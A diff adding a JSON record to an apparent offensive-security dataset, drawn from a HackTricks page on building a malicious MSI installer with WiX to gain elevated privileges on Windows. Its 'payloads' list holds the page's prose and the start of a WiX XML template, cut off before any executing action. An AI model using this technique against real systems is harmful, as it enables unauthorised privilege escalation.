@@ -1,0 +1,27 @@
+{
+  "id": "windows_hardening_cbca5284355d",
+  "category": "windows-hardening",
+  "title": "create msi with wix",
+  "description": "# Creating Malicious MSI and Getting Root\n\n{{#include ../../banners/hacktricks-training.md}}\n\nThe creation of the MSI installer will be done using wixtools, specifically [wixtools](http://wixtoolset.org) will be utilized. It is worth mentioning that alternative MSI builders were attempted, but they were not successful in this particular case.\n\nFor a comprehensive understanding of wix MSI usage examples, it is advisable to consult [this page](https://www.codeproject.com/Tips/105638/A-quick-introd",
+  "payloads": [
+    "# Creating Malicious MSI and Getting Root",
+    "{{#include ../../banners/hacktricks-training.md}}",
+    "The creation of the MSI installer will be done using wixtools, specifically [wixtools](http://wixtoolset.org) will be utilized. It is worth mentioning that alternative MSI builders were attempted, but they were not successful in this particular case.",
+    "For a comprehensive understanding of wix MSI usage examples, it is advisable to consult [this page](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Here, you can find various examples that demonstrate the usage of wix MSI.",
+    "The aim is to generate an MSI that will execute the lnk file. In order to achieve this, the following XML code could be employed ([xml from here](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):",
+    "```html",
+    "<?xml version=\"1.0\"?>",
+    "<Wix xmlns=\"http://schemas.microsoft.com/wix/2006/wi\">",
+    "<Product Id=\"*\" UpgradeCode=\"12345678-1234-1234-1234-111111111111\" Name=\"Example Product Name\"",
+    "Version=\"0.0.1\" Manufacturer=\"@_xpn_\" Language=\"1033\">",
+    "<Package InstallerVersion=\"200\" Compressed=\"yes\" Comments=\"Windows Installer Package\"/>",
+    "<Media Id=\"1\" Cabinet=\"product.cab\" EmbedCab=\"yes\"/>",
+    "<Directory Id=\"TARGETDIR\" Name=\"SourceDir\">",
+    "<Directory Id=\"ProgramFilesFolder\">",
+    "<Directory Id=\"INSTALLLOCATION\" Name=\"Example\">"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md"
+  ]
+}
